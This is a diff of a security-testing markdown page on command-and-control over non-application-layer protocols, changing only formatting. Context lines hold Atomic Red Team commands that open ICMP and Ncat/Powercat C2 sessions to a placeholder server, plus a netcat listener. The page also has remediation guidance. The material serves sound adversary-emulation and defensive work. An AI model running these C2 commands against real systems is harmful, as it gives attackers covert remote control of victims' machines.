@@ -33,10 +33,8 @@ tech_stack:
   - windows
 cwe_ids:
   - CWE-300
-chains_with:
-  []
-prerequisites:
-  []
+chains_with: []
+prerequisites: []
 severity_boost: {}
 ---
 
@@ -73,7 +71,7 @@ The following tests are from [Atomic Red Team](https://github.com/redcanaryco/at
 
 ### Atomic Test 1: ICMP C2
 
-This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener
+This will attempt to start C2 Session Using ICMP. For information on how to set up the listener
 refer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/
 
 **Supported Platforms:** windows
@@ -86,7 +84,7 @@ Invoke-PowerShellIcmp -IPAddress #{server_ip}
 ### Atomic Test 2: Netcat C2
 
 Start C2 Session Using Ncat
-To start the listener on a Linux device, type the following: 
+To start the listener on a Linux device, type the following:
 nc -l -p <port>
 
 **Supported Platforms:** windows
@@ -96,12 +94,13 @@ cmd /c "#{ncat_exe}" #{server_ip} #{server_port}
 ```
 
 **Dependencies:**
+
 - ncat.exe must be available at specified location (#{ncat_exe})
 
 ### Atomic Test 3: Powercat C2
 
 Start C2 Session Using Powercat
-To start the listener on a Linux device, type the following: 
+To start the listener on a Linux device, type the following:
 nc -l -p <port>
 
 **Supported Platforms:** windows
@@ -119,12 +118,12 @@ This method allows attackers to communicate and control compromised devices whil
 For more details, check this blog: [ICMP Reverse Shell Blog](https://cryptsus.com/blog/icmp-reverse-shell.html)
 
 **Important Notes:**
+
 - Use `[icmp-cnc]` for the C2 server (Attacker) and `[icmpdoor]` for the C2 client (Victim).
 - Binaries work on Ubuntu 22.04.5 LTS; for CentOS Stream or other, use the Python file from the GitHub link [https://github.com/krabelize/icmpdoor].
 - Root access is required.
 
 **Supported Platforms:** linux
-
 
 ### Manual Testing
 
@@ -139,35 +138,36 @@ If Atomic Red Team tests are not applicable, manually verify the technique by:
 ## Remediation Guide
 
 ### M1031 Network Intrusion Prevention
+
 Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.
 
 ### M1047 Audit
+
 Periodically investigate ESXi hosts for open VMCI ports. Running the `lsof -A` command and inspecting results with a type of `SOCKET_VMCI` will reveal processes that have open VMCI ports.
 
 ### M1037 Filter Network Traffic
+
 Filter network traffic to prevent use of protocols across the network boundary that are unnecessary. If VMCI is not required in ESXi environments, consider restricting guest virtual machines from accessing VMCI services.
 
 ### M1030 Network Segmentation
-Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces.
 
+Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces.
 
 ## Detection
 
 ### Detection of Non-Application Layer Protocols for C2
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| Non-Application Layer Protocol technique applicable | High | Command And Control |
+| Finding                                             | Severity | Impact              |
+| --------------------------------------------------- | -------- | ------------------- |
+| Non-Application Layer Protocol technique applicable | High     | Command And Control |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                              |
+| ------- | ---------------------------------- |
 | CWE-300 | Channel Accessible by Non-Endpoint |
-
 
 ## References
 
